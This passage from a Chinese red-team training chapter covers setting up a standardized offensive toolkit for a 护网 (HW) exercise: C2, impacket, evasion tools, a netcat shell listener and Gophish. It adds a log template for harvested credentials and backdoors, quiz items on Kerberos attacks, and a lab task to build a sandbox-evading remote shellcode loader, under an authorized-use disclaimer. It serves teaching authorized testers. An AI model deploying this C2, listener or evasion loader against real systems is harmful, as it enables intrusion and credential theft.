# 目标 EDR 未告警，shell 成功上线
```

**结果**：自研加载器成功绕过目标 EDR，维持稳定 C2 通道。

**关键收获**：
- 自研是终极免杀方案
- 多重技术叠加（加密+动态解析+沙箱检测）
- 持续迭代应对 EDR 升级

---

### 案例 5：护网工具箱配置

**背景**：某团队准备参加年度护网行动，需配置一套标准化、可快速部署的红队工具箱。

**实施步骤**：

1. **工具箱结构设计**

```bash
mkdir -p ~/hw_toolkit/{recon,exploit,post,lateral,evasion,c2,phishing,reports,docs}
```

2. **部署核心工具**

```bash
#!/bin/bash
# deploy_toolkit.sh
TOOLKIT=~/hw_toolkit

# 信息收集
cd $TOOLKIT/recon
git clone https://github.com/projectdiscovery/subfinder.git
git clone https://github.com/projectdiscovery/httpx.git
git clone https://github.com/projectdiscovery/nuclei.git

# 漏洞利用
cd $TOOLKIT/exploit
git clone https://github.com/sqlmapproject/sqlmap.git
git clone https://github.com/commixproject/commix.git

# 后渗透
cd $TOOLKIT/post
git clone https://github.com/PowerShellMafia/PowerSploit.git
git clone https://github.com/GhostPack/Seatbelt.git

# 横向移动
cd $TOOLKIT/lateral
git clone https://github.com/fortra/impacket.git
git clone https://github.com/Pennyw0rth/NetExec.git

# 免杀
cd $TOOLKIT/evasion
git clone https://github.com/TheWover/donut.git
git clone https://github.com/klezVirus/SysWhispers3.git

# C2
cd $TOOLKIT/c2
git clone https://github.com/BishopFox/sliver.git
```

3. **配置文件管理**

```bash
# 配置 Sliver
mkdir -p ~/.sliver
cat > ~/.sliver/configs/sliver.yml << EOF
daemon:
  host: 0.0.0.0
  port: 31337
implant:
  os: windows
  arch: amd64
  format: shared
  obfuscation: true
EOF

# 配置 Impacket
cat > $TOOLKIT/lateral/impacket/examples/config.ini << EOF
[default]
domain = finbank.local
dc_ip = 192.168.1.1
EOF
```

4. **环境一键启动**

```bash
#!/bin/bash
# start_env.sh —— 一键启动护网环境
echo "[*] 启动护网红队环境..."

# 启动 Sliver C2
tmux new-session -d -s sliver "sliver-server"
echo "[+] Sliver C2 已启动 (tmux: sliver)"

# 启动代理
tmux new-session -d -s proxy "frpc -c ~/hw_toolkit/proxy/frpc.ini"
echo "[+] 代理已启动 (tmux: proxy)"

# 启动监听
tmux new-session -d -s listener "nc -lvnp 4444"
echo "[+] 监听已启动 (tmux: listener)"

# 启动钓鱼平台
tmux new-session -d -s gophish "cd ~/hw_toolkit/phishing/gophish && ./gophish"
echo "[+] Gophish 已启动 (tmux: gophish)"

echo ""
echo "[+] 环境就绪，使用 'tmux attach -t <name>' 进入对应会话"
echo "[+] 工具箱目录: ~/hw_toolkit"
echo "[+] 操作日志: ~/hw_toolkit/reports/ops.log"
```

5. **操作日志模板**

```bash
# 创建操作日志
cat > ~/hw_toolkit/reports/ops_template.md << 'EOF'
# 护网红队操作日志

## 基本信息
- 行动代号: 
- 行动时间: 
- 目标范围: 
- 授权方: 

## 操作记录

### YYYY-MM-DD HH:MM
- 操作内容: 
- 使用工具: 
- 目标 IP/域名: 
- 执行命令: 
- 结果: 
- 截图: 

### YYYY-MM-DD HH:MM
...

## 资产清单
| IP | 服务 | 漏洞 | 状态 |
|----|------|------|------|

## 凭据收集
| 用户名 | 密码/Hash | 来源 | 时间 |
|--------|-----------|------|------|

## 已植入后门
| 主机 | 后门类型 | 端口 | 备注 |
|------|---------|------|------|

## 清理清单
- [ ] 删除所有植入文件
- [ ] 删除所有计划任务
- [ ] 删除所有服务
- [ ] 删除所有用户
- [ ] 恢复配置文件

EOF
```

6. **演练测试**

```bash
# 在内部靶场测试工具箱
./start_env.sh
# 验证所有工具可用
./toolkit_test.sh
```

**结果**：成功配置标准化护网工具箱，团队可在 5 分钟内完成环境部署。

**关键收获**：
- 标准化工具箱提升团队协作效率
- 操作日志是合规的关键
- 清理清单确保不留痕迹

---

## 习题

### 一、选择题（10 道）

1. 下列工具中，主要用于**被动子域名收集**的是？
   - A. Nmap
   - B. Subfinder
   - C. SQLMap
   - D. Mimikatz

2. Impacket 套件中，用于 **Kerberoasting 攻击**的工具是？
   - A. psexec.py
   - B. secretsdump.py
   - C. GetUserSPNs.py
   - D. ticketer.py

3. 下列哪种技术**不能**用于免杀？
   - A. shellcode 加密
   - B. 直接系统调用
   - C. 进程注入
   - D. 端口扫描

4. **黄金票据**（Golden Ticket）需要获取以下哪个账户的 Hash？
   - A. Administrator
   - B. krbtgt
   - C. SQLService
   - D. Domain Admin

5. 下列 C2 框架中，**开源**且基于 Go 语言开发的是？
   - A. Cobalt Strike
   - B. Sliver
   - C. Metasploit
   - D. Burp Suite

6. Pass the Hash（PTH）攻击使用的凭据是？
   - A. 明文密码
   - B. NTLM Hash
   - C. Kerberos 票据
   - D. SSH 密钥

7. 下列工具中，用于**中间人钓鱼**绕过 MFA 的是？
   - A. Gophish
   - B. EvilGinx
   - C. Nuclei
   - D. Donut

8. AS-REP Roasting 针对的是哪类账户？
   - A. 域管理员
   - B. 服务账户（有 SPN）
   - C. 未启用预认证的账户
   - D. 禁用账户

9. 下列哪项**不是**护网行动的合规要求？
   - A. 在授权范围内操作
   - B. 不破坏业务系统
   - C. 删除所有日志
   - D. 提交评估报告

10. **Donut** 工具的主要功能是？
    - A. 子域名收集
    - B. 端口扫描
    - C. 将 .NET 程序集转换为 shellcode
    - D. 邮件钓鱼

### 二、填空题（5 道）

1. 红队攻击杀伤链（Cyber Kill Chain）的七个阶段是：侦察、________、投递、利用、安装、命令控制、________。

2. Impacket 的 `secretsdump.py` 使用 `-just-dc` 参数时，采用的是 ________ 方式远程获取域凭据，这种方式不需要在域控上落地文件。

3. 免杀技术中，绕过 EDR 的 API Hook 通常采用 ________ 技术，即直接调用 ntdll 的系统调用号。

4. Kerberoasting 攻击获取的是 ________ 票据，需要使用 Hashcat 的 ________ 模式进行离线破解。

5. 红队工具链的协作核心是 ________ 的标准化与流转，前一阶段工具的输出成为后一阶段工具的输入。

### 三、简答题（3 道）

1. 简述红队工具链的五大组成部分（侦察/攻击/后渗透/免杀/钓鱼），并说明各部分的核心目标与代表工具。

2. 描述从外网 Web 服务到域控的完整横向移动路径，包括使用的工具与关键技术。

3. 在护网行动中，如何构建一个合规且高效的红队工具箱？请从工具选型、环境部署、操作日志、清理恢复四个方面说明。

### 四、实操题（2 道）

1. **自动化信息收集流水线搭建**

   要求：
   - 使用 Python 编写一个自动化信息收集脚本
   - 输入：目标域名
   - 功能：
     - 使用 Subfinder 收集子域名
     - 使用 httpx 验证 Web 存活
     - 使用 Nuclei 扫描高危漏洞
     - 生成 Markdown 格式的报告
   - 输出：报告文件包含子域名数量、存活 Web 数量、发现的漏洞列表

   提示：
   - 使用 `subprocess` 模块调用外部工具
   - 使用 `Path` 管理工作目录
   - 报告使用 Markdown 格式，包含表格与代码块

2. **自研免杀加载器开发**

   要求：
   - 使用 C# 或 Go 开发一个 shellcode 加载器
   - 功能：
     - 从远程 URL 获取 AES 加密的 shellcode
     - 本地解密后内存执行
     - 包含至少一项反沙箱检测（如检查 CPU 核数、延迟执行）
   - 编写配套的 Python 加密脚本
   - 测试：在测试环境中验证加载器功能（使用无害的 shellcode，如 calc.exe 弹出）

   提示：
   - C# 参考 `VirtualAlloc` + `CreateThread` 模式
   - Go 参考 `syscall` 包
   - AES 加密使用 CBC 模式
   - 反沙箱检测可参考检查 `Environment.ProcessorCount`、`DateTime.Now`

---

## 法律免责声明

> ⚠️ **重要声明**
>
> 本章所有内容仅用于**授权的红队安全评估、安全研究与教学目的**。文中介绍的工具、技术与攻击手法，必须在**获得目标所有者书面授权**的前提下使用。
>
> **未经授权**对任何计算机信息系统进行渗透测试、漏洞利用、数据获取等行为，均违反《中华人民共和国网络安全法》《中华人民共和国刑法》（第 285 条、第 286 条）等相关法律法规，可能构成：
> - 非法侵入计算机信息系统罪
> - 非法获取计算机信息系统数据罪
> - 非法控制计算机信息系统罪
> - 破坏计算机信息系统罪
>
> 上述犯罪最高可判处**七年以上有期徒刑**，并处罚金。
>
> 读者应当：
> 1. 仅在合法授权的范围内使用所学知识
> 2. 在自建靶场或获得授权的环境中练习
> 3. 遵守所在国家/地区的网络安全法律法规
> 4. 不得将本章技术用于任何非法用途
>
> 作者与出版方对读者滥用本章内容所导致的任何法律后果**不承担任何责任**。读者需自行承担因不当使用本章内容而产生的一切法律责任。
>
> **请做一名合法、合规、负责任的安全从业者。**

---

> 📚 **延伸阅读**：
> - 《红队：网络安全攻防指南》—— 段钢
> - 《Web 安全深度剖析》—— 张炳帅
> - 《内网安全攻防》—— 徐焱、贾晓璐
> - MITRE ATT&CK 框架：https://attack.mitre.org/
> - Awesome Red Teaming：https://github.com/yeyintminthuhtut/Awesome-Red-Teaming
